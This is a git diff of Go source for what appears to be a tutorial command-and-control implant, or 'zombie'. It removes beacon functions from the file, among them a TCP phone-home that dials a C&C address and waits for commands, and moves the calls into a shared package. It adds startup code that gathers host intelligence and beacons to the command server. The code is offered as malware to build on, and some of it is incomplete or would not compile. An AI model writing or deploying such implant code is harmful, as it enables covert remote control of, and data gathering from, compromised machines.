@@ -32,61 +32,6 @@ import (
 	"net"
 )
 
-// Beacons
-// TODO: "strange" ways of reaching out
-// makes requests outside the network to get to the C&C
-
-//used for reaching out with regular TCP connection, this will hand off to regular connection
-// if a "good password *HINT*" is provided
-// put the id of the entity connecting to let the host know it's us
-func BaconTCP(zombie_ID string) {
-	shared_code.PHONEHOME_TCP.IP = net.IP(shared_code.Remote_tcpaddr)
-	connection, derp := net.DialTCP("tcp", &shared_code.Local_tcpaddr_LAN, &shared_code.PHONEHOME_TCP)
-	if derp != nil {
-		// print the error
-		shared_code.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
-		return
-	}
-	// now we just wait...
-	/// zombie should be dialing the home base expecting commands on connect
-	// assuming we coded the command and control to reply on connect and not just
-	// mark "we got one here" in some internal DB...
-	// why dont you try coding some behaviors for the command and control binary
-	// to enact on BEACON!
-	// TODO: code C&C to pool callbacks into a list
-	for {
-		netData, derp := bufio.NewReader(connection).ReadString('\n')
-		if derp != nil {
-			// print the error
-			shared_code.Error_printer(derp, "[-] Error: TCP Beacon Connection Threw some odd data our way and Failed")
-			return
-		}
-	}
-}
-
-// Same for UDP
-func BeaconUDP() {
-}
-
-// we are going to make different HTTP requests to the Command Server in an ettempt to
-// silently
-func BeaconHTTP() {
-
-}
-
-func BeaconDNS(name) {
-	MDNS_BEACON := shared_code.FakeMDNSService{}
-	shared_code.StartMdnsReceiver(MDNS_BEACON)
-}
-
-/*
-function to hash a string to compare against the hardcoded password
- never hardcode a password in plaintext
- we use the strongest we can and a good password...
-
- For the porpoises of this tutorial, we use a weak password.
-*/
-
 // function to provide outbound connections via threading
 //-----------------Local IP---------Remote IP---------PORT-------
 func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
@@ -157,16 +102,24 @@ Goroutines run in the same address space, so access to shared memory must be syn
 /*/
 func main() {
 	// regardless of the beacon state, and anything else. I am going to instantiate a
-	// new CommandSet pool to handle anything we send later...
+	// new CommandSet pool to handle anything we send/receive later...
 	// we know where this zombie is... right?
+	// are we even doin this in the right hekin order?
+	// what determines the right order anyways?!!?
+	CommandPool := shared_code.NewCommandSet()
+	ZombieInformation := shared_code.NewHostIntel()
+
+	// start gathering all the info
+	shared_code.GatherIntel(ZombieInformation)
+
 	if shared_code.BEACON_ON_START == true {
 		switch shared_code.BACON_TYPE {
 		case "tcp":
-			go BaconTCP()
+			go shared_code.BaconTCP()
 		case "udp":
-			go BeaconUDP()
+			go shared_code.BeaconUDP()
 		case "http":
-			go BeaconHTTP()
+			go shared_code.BeaconHTTP()
 		}
 	}
 	shared_code.GetTCPConnections()
